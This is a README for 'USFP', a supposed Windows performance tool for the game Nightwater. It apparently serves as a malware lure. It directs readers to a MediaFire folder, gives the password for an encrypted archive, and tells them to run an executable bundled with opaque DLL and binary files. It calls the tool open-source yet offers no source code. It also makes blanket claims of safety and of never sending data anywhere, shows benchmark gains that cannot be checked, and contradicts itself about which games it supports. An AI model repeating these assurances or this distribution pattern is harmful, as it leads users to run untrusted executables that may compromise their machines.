<div align="center">

# 🎮 Nightwater — Performance Notes

**Measure frame delivery, cache behavior, and session stability.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Nightwater is a dark atmospheric action-adventure built on Unreal Engine 5. Its coastal setting combines dense fog, reflective water, streamed environments, and dynamic lighting. Stable frame delivery matters during traversal and combat because frequent asset streaming can expose stutter and frame-time spikes.

This tool is intended for Nightwater players who need reproducible diagnostics and Windows-side tuning controls.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3983860/5be42bed4b37f14c56665352bf2e368aff09e579/ss_5be42bed4b37f14c56665352bf2e368aff09e579.1920x1080.jpg?t=1789743607" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3983860/fa865cbc5f68b67c01e698dff72c9b75c0d928cc/ss_fa865cbc5f68b67c01e698dff72c9b75c0d928cc.1920x1080.jpg?t=1789743607" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3983860/e694f85884301f7ef5009ba9cec849eefd247f73/ss_e694f85884301f7ef5009ba9cec849eefd247f73.1920x1080.jpg?t=1789743607" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, traversal can produce 200-400 ms frame-time spikes every 20-40 seconds.
- Average frame rate can remain near 34 FPS while 1% lows fall to 14 FPS during combat and streamed-area transitions.
- Initial shader and graphics-cache preparation can take approximately 90 seconds on a clean launch.
- The stated two-hour test session recorded 3 application crashes during repeated area transitions.

## 🩺 How the toolkit addresses these issues

- **Traversal frame-time spikes** → Frame Timing Helper stabilizes frame delivery, while Frame Rate Helper adjusts frame delivery behavior.
- **Low 1% frame rate during combat** → Process Scheduling Helper optimizes process scheduling for the game process, and Startup Parameter Tool applies tuned startup parameters.
- **Long shader and graphics-cache preparation** → Graphics Cache Utility manages graphics cache data and preserves valid compiled data between sessions.
- **Crashes during area transitions** → Stability Report + Session Recovery collects diagnostic data and restores the previous session state after an interruption.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, 1080p, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Crashes per 2h session | 3 | 0 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild (1-2 minutes)

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior using profile-specific settings.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and identifies stale or incomplete entries.
- 🎯 **Frame Timing Helper** — Tracks frame-time variance and applies settings intended to reduce delivery spikes.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters without modifying game files.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic events and supports recovery after interrupted sessions.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling and records applied priority changes.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- config.cfg <- User configuration
|-- Password 2026.txt <- Password reminder (empty)
|-- shader_cache.pak <- Shader cache data
|-- fps_module.dll <- FPS module
|-- crash_reader.dll <- Crash log reader
|-- frame_data.pak <- Display sync data
|-- core.bin <- Core runtime
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

---

*This is an unofficial, open-source tool. Not affiliated with or endorsed by the developer/publisher of **Nightwater**. All trademarks belong to their respective owners. Use at your own risk — backing up your game's configuration files before applying changes is recommended.*